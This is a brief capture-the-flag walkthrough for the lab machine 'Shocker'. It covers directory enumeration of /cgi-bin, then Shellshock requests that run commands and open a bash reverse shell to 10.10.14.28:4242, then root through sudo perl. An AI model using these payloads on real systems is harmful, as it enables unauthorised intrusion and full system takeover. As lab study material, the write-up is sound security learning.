# SHOCKER

### RECON 

```
dirb http://10.10.10.56/ /usr/share/wordlists/dirb/big.txt
http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)
http://10.10.10.56/server-status (CODE:403|SIZE:299)     
```

/cgi-bin is designed to use scripts on the website 

```
dirb http://10.10.10.56/cgi-bin /usr/share/wordlists/dirb/big.txt -X .pl,.sh
http://10.10.10.56/cgi-bin/user.sh (CODE:200|SIZE:119)
```

/cgi-bin + user.sh + the name of the machine shocker we can safely assume we have to use shell-shock

```
locate nse | grep shellshock
```

```
GET /cgi-bin/user.sh HTTP/1.1
Host: localhost:8081
Connection: close
User-Agent: () { :;}; echo; /bin/ls /;
```
so now we have command execution lets get a reverse shell
```
GET /cgi-bin/user.sh HTTP/1.1
Cookie: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.10.14.28/4242 0>&1
Connection: close
Host: localhost:8081
```

from here we are shelly and can access /home/shelly and get the user.txt
sudo -l tells us that /usr/bin/perl can be used as sudo without password so lets play with that

quick search on gtfobins gets us to try 
```
sudo perl -e 'exec "/bin/sh";'
```

```
# whoami
root
```

thats is rooted
